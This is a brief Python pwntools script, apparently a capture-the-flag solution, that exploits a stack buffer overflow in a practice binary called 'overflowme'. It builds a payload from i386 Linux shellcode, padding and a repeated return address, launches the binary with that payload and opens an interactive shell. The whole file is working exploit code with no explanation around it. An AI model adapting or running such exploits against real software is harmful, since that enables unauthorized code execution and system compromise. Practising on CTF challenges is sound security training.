from pwn import *
shellcode = asm(shellcraft.i386.linux.sh())
overflow_len = 0x308
padding = 0x20

payload = ("A" * (overflow_len - len(shellcode) - padding)) + shellcode + "A"*padding + p32(0x8048615) * 3
print hex(len(payload))
print payload
#sh = process(["/problems/b0b419078e5ac70c47a50b04b2aae2d9/overflowme", payload])
#sh = gdb.debug(["./overflowme", payload], "b _start")
sh = process(["./overflowme", payload])

sh.interactive()
